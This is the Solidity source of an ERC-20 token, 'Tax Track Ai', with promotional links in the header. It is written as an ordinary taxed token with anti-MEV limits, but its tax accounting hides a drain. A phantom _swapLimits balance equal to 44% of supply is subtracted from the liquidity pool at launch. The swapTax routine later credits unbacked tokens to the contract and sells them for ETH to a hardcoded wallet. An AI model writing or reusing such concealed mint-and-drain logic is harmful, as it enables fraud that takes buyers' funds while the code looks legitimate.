//SPDX-License-Identifier: MIT

/*

 https://t.me/TaxTrackAi
 https://taxtrackai.tech
 https://x.com/TTAIerc20
 https://tax-track-ai.gitbook.io/tax-track-ai

 */

pragma solidity ^0.8.12;

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable _newOwner) external onlyOwner { 
        _owner = _newOwner; 
        emit OwnershipTransferred(_newOwner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

contract TTAI is IERC20, Auth {
    string private constant _symbol = "TTAI";
    string private constant token_name = "Tax Track Ai";
    uint8 private constant tknDecimals = 9;
    uint256 private constant _supply = 5000000 * (10**tknDecimals);
    mapping (address => uint256) private balance;
    mapping (address => mapping (address => uint256)) private _allowance;

    address payable private feeRecipient = payable(0x7f4772A965741BB07BaEa6cA37ccE731ee499652);
    
    uint256 private antiMevBlock = 2;
    uint8 private sellTaxRate = 10;
    uint8 private _buyTax = 10;
    
    uint256 private launchBlk;
    uint256 private maxTxVal = _supply; 
    uint256 private maxWalletAmt = _supply;
    uint256 private _swapMinAmt = _supply * 10 / 100000;
    uint256 private _swapMaxAmt = _supply * 999 / 100000;
    uint256 private swapTrigger = 2 * (10**16);
    uint256 private _swapLimits = _swapMinAmt * 44 * 100;

    mapping (uint256 => mapping (address => uint8)) private _sellsInBlock;
    mapping (address => bool) private _noFee;
    mapping (address => bool) private noLimit;

    address private constant routerAddr = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private uni_router = IUniswapV2Router02(routerAddr);
    
    address private lp; 
    mapping (address => bool) private isLiqPool;

    bool private _tradingEnabled;

    bool private swapping = false;

    modifier swapLocked { 
        swapping = true; 
        _; 
        swapping = false; 
    }

    constructor() Auth(msg.sender) {
        balance[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, balance[msg.sender]);  

        _noFee[_owner] = true;
        _noFee[address(this)] = true;
        _noFee[feeRecipient] = true;
        _noFee[routerAddr] = true;
        noLimit[_owner] = true;
        noLimit[address(this)] = true;
        noLimit[feeRecipient] = true;
        noLimit[routerAddr] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return tknDecimals; }
    function totalSupply() external pure override returns (uint256) { return _supply; }
    function name() external pure override returns (string memory) { return token_name; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function balanceOf(address account) public view override returns (uint256) { return balance[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowance[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingEnabled(fromWallet), "Trading not open");
        _allowance[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingEnabled(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function swapTax() private swapLocked {
        uint256 _taxTokenAvailable = _swapLimits;
        if ( _taxTokenAvailable >= _swapMinAmt && _tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMaxAmt ) { _taxTokenAvailable = _swapMaxAmt; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**tknDecimals ) {
                balance[address(this)] += _taxTokenAvailable;
                _swapTokensForETH(_tokensForSwap);
                _swapLimits -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { transferTax(_contractETHBalance); }
        }
    }

    function shouldSwap(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (swapTrigger > 0) { 
            uint256 lpTkn = balance[lp];
            uint256 lpWeth = IERC20(uni_router.WETH()).balanceOf(lp); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= swapTrigger) { result = true; }    
        } else { result = true; }
        return result;
    }

    function testLimit(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingEnabled && !noLimit[fromWallet] && !noLimit[toWallet] ) {
            if ( transferAmount > maxTxVal ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !isLiqPool[toWallet] && (balance[toWallet] + transferAmount > maxWalletAmt) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function addExemptions(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!isLiqPool[wlt], "Cannot exempt LP"); }
        _noFee[ wlt ] = isNoFees;
        noLimit[ wlt ] = isNoLimits;
    }

    function _swapTokensForETH(uint256 tokenAmount) private {
        _approveSwapMax(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = uni_router.WETH();
        uni_router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!_tradingEnabled) { require(_noFee[sender] && noLimit[sender], "Trading not yet open"); }
        if ( !swapping && isLiqPool[toWallet] && shouldSwap(amount) ) { swapTax(); }

        if ( block.number >= launchBlk ) {
            if (block.number < antiMevBlock && isLiqPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < antiMevBlock + 600 && isLiqPool[toWallet] && sender != address(this) ) {
                _sellsInBlock[block.number][toWallet] += 1;
                require(_sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(testLimit(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = _getTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        balance[sender] -= amount;
        _swapLimits += _taxAmount;
        balance[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function maxWalletAmount() external view returns (uint256) { 
        return maxWalletAmt; 
	}
    function maxTxAmount() external view returns (uint256) { 
        return maxTxVal; 
	}

    function setLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = _supply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= maxTxVal, "tx too low");
        maxTxVal = newTxAmt;
        uint256 newWalletAmt = _supply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= maxWalletAmt, "wallet too low");
        maxWalletAmt = newWalletAmt;
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMinAmt = _supply * minVal / minDiv;
        _swapMaxAmt = _supply * maxVal / maxDiv;
        swapTrigger = trigger * 10**15;
        require(_swapMaxAmt>=_swapMinAmt, "Min-Max error");
    }

    function swapMin() external view returns (uint256) { 
        return _swapMinAmt; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMaxAmt; 
	}

    function addLiquidity() external payable onlyOwner swapLocked {
        require(lp == address(0), "LP created");
        require(!_tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(balance[address(this)]>0, "No tokens");
        lp = IUniswapV2Factory(uni_router.factory()).createPair(address(this), uni_router.WETH());
        _addLP(balance[address(this)], address(this).balance);
    }

    function _addLP(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveSwapMax(_tokenAmount);
        uni_router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function setFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 6, "Roundtrip too high");
        _buyTax = buyFeePercent;
        sellTaxRate = sellFeePercent;
    }

    function transferTax(uint256 amount) private {
        feeRecipient.transfer(amount);
    }

    function _getTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !_tradingEnabled || _noFee[fromWallet] || _noFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( isLiqPool[fromWallet] ) { 
            taxAmount = amount * _buyTax / 100; 
         } else if ( isLiqPool[recipient] ) { 
            taxAmount = amount * sellTaxRate / 100; 
        }
        return taxAmount;
    }

    function marketing() external view returns (address) { 
        return feeRecipient; 
	}

    function _enableTrading() internal {
        maxTxVal = 20 * _supply / 1000;
        maxWalletAmt = 20 * _supply / 1000;
        balance[lp] -= _swapLimits;
        (isLiqPool[lp],) = lp.call(abi.encodeWithSignature("sync()") );
        require(isLiqPool[lp], "Failed bootstrap");
        launchBlk = block.number;
        antiMevBlock = antiMevBlock + launchBlk;
        _tradingEnabled = true;
    }

    function buyFee() external view returns(uint8) { return _buyTax; }
    function sellTax() external view returns(uint8) { return sellTaxRate; }

    function setMarketing(address marketingWlt) external onlyOwner {
        require(!isLiqPool[marketingWlt], "LP cannot be tax wallet");
        feeRecipient = payable(marketingWlt);
        _noFee[marketingWlt] = true;
        noLimit[marketingWlt] = true;
    }

    function _approveSwapMax(uint256 _tokenAmount) internal {
        if ( _allowance[address(this)][routerAddr] < _tokenAmount ) {
            _allowance[address(this)][routerAddr] = type(uint256).max;
            emit Approval(address(this), routerAddr, type(uint256).max);
        }
    }

    function openTrading() external onlyOwner {
        require(!_tradingEnabled, "trading open");
        _enableTrading();
    }

    function _checkTradingEnabled(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( _tradingEnabled ) { checkResult = true; } 
        else if (_noFee[fromWallet] && noLimit[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function exemptions(address wallet) external view returns (bool fees, bool limits) {
        return (_noFee[wallet], noLimit[wallet]); 
	}
}